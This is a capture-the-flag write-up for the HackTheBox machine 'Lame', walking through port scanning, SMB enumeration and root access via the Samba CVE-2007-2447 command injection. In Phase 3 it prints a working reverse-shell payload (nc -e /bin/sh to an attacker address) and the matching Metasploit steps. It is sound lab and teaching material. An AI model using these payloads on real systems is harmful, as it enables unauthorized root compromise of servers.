---
toc: true
comments: true
title: HackTheBox - Lame
layout: post
title: HackTheBox - Lame
date: 2024-05-24 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, Samba, SMB, FTP, distcc, CVE-2007-2447, RCE]    
image: /assets/Posts/Lame/logo.png
---

## Pre
- Time to cross the fence into HackTheBox. After a good run of TryHackMe rooms I wanted to try the box everyone tells you to start with, and Lame is _the_ classic first machine (box ID #3, it has been around since 2017).
- Lame is a great reminder that "old and boring" services are exactly where the easy wins live. No fancy chaining here, just careful enumeration and a 2007 Samba bug that hands you root in one shot.
- If you already read my [Kenobi writeup](/posts/tryhackme-kenobi/) a lot of the SMB/FTP enumeration will feel familiar, so this is a natural next step.

## Phase 1: Recon
Same routine as always: one quick scan to find open ports, then a deeper scan with versions and default scripts only on what we found. I like keeping the output in a `nmap/` folder and exporting the target IP to `$IP` so the commands stay short.

```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT     STATE SERVICE     REASON
21/tcp   open  ftp         syn-ack
22/tcp   open  ssh         syn-ack
139/tcp  open  netbios-ssn syn-ack
445/tcp  open  microsoft-ds syn-ack
3632/tcp open  distccd     syn-ack
```

Five ports. FTP, SSH, the SMB pair (139/445) and a slightly unusual one: `3632`, which is `distccd`. Let's grab versions on all of them.

```shell
$ nmap -Pn -n -p 21,22,139,445,3632 -T4 -sSCV -A -oN nmap/versions $IP

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

This scan is basically a list of CVEs waiting to happen. Three things jump out immediately:

- **vsftpd 2.3.4** – the version with the famous "smiley face" backdoor (CVE-2011-2523).
- **Samba 3.0.20** – old enough to be vulnerable to the *username map script* command injection (CVE-2007-2447).
- **distccd v1** – vulnerable to CVE-2004-2687, a distributed-compiler command execution bug.

Three roads to try. Let's walk them in order and see which one is not a trap.

## Phase 2: Rabbit Holes and SMB
The instinct on a box called *Lame* is to go straight for the flashiest bug, so let's talk about the first temptation: **vsftpd 2.3.4**.

```shell
$ searchsploit vsftpd 2.3.4
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)   | unix/remote/17491.rb
--------------------------------------------------------- ---------------------------------
```

The backdoor works by sending a username ending in `:)` which should open a root shell on port `6200`. In theory. In practice, on Lame this **does not trigger** – the box never opens 6200 and the exploit just hangs. This is a well-known dead end and a good lesson: a matching version number is a *lead*, not a guarantee. Don't marry your first exploit.

> A vulnerable version banner only tells you the code is present, not that the vulnerable path is reachable or that the box was left in a exploitable state. Always keep a second and third option ready.
{: .prompt-tip }

With FTP being a distraction, let's do what we did on Kenobi and enumerate SMB properly. First an anonymous share listing:

```shell
$ smbclient -L //$IP/ -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```

We can list shares without credentials, and `tmp` is readable/writable. We could dig around in there, but the version string `Samba 3.0.20-Debian` is the real prize. Let's confirm the exploit path.

```shell
$ searchsploit Samba 3.0.20
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass   | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command| unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                    | linux/remote/7701.txt
--------------------------------------------------------- ---------------------------------
```

There it is: **`Username map script` Command Execution**, aka CVE-2007-2447. This is the intended path and, unlike the FTP backdoor, it is rock solid.

## Phase 3: CVE-2007-2447 (root in one move)
The bug lives in the `username map script` feature of `smb.conf`. When Samba is configured with that option, it passes the client-supplied username to a shell **without sanitising it**. That means if we log in with a username that contains shell metacharacters, Samba will happily execute them – and since `smbd` runs as **root**, whatever we inject runs as root too.

The payload is a username of the shape `` /=`command` ``. The backticks force command substitution during the mapping, so our command runs on the server. Let's put a listener up first:

```shell
$ nc -lvnp 4444
```

And then trigger the injection through `smbclient`. We don't actually care about authenticating – we just need Samba to *process* our username:

```shell
$ smbclient //$IP/tmp -N -c 'logon "/=`nohup nc -e /bin/sh 10.10.14.7 4444`"'
```

A couple of notes on why this works the way it does:

- The `logon` command tells `smbclient` to (re)authenticate with the username we provide, which is exactly what feeds our string into the vulnerable mapping routine.
- `nohup` keeps our reverse shell alive even after `smbclient` gives up on the "login".
- `nc -e` is available because the target is an old Debian shipping the traditional netcat. If it were missing, we would swap in a mkfifo reverse shell instead.

Back on the listener, we catch the connection. Let's confirm who we are and stabilise the shell:

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.3] 44215
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# id
uid=0(root) gid=0(root)
root@lame:/# whoami
root
```

No privilege escalation phase needed – we landed as root directly, because the vulnerable service itself runs as root. Both flags are now a `find` away:

```shell
root@lame:/# find / -type f -iname user.txt 2>/dev/null
root@lame:/# find / -type f -iname root.txt 2>/dev/null
```

### The Metasploit equivalent
For completeness, this is one of those cases where Metasploit maps 1:1 to the manual technique. The module simply automates the exact same username-injection trick:

```shell
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
msf6 exploit(multi/samba/usermap_script) > run
```

I still prefer the manual route here because you actually *see* the mechanism – a username being executed as a command – instead of a black box that says "session opened".

### Bonus path: distcc
If Samba had been patched we would not be stuck. Port `3632` runs `distccd`, vulnerable to **CVE-2004-2687**, which lets us run commands through the distributed compiler protocol. The catch is that distcc runs as the low-privileged `daemon` user, so that route would drop us with a much weaker shell and *then* require a privilege escalation step (the box is old enough to be vulnerable to `udev`/kernel exploits). Since Samba gives us root for free, we take the shortcut – but it's worth knowing the box has more than one way in.

## Conclusions
- Lame is the perfect "welcome to HTB" box: no rabbit-hole chaining, just enumerate the services and pick the one that pays the most.
- The big lesson is exploit triage. We had three vulnerable-looking services; one was a dead end (vsftpd), one gave a weak shell (distcc), and one gave instant root (Samba). Recognising which is which is half the job.
- CVE-2007-2447 is a beautiful example of why passing user input to a shell is a terrible idea – the same class of bug (command injection) shows up constantly in modern web apps too.
- Next up on the Windows side of the house is [Legacy](/posts/hackthebox-legacy/), the other box everyone starts HTB with.

_Keep hacking_  🙈🙉🙊
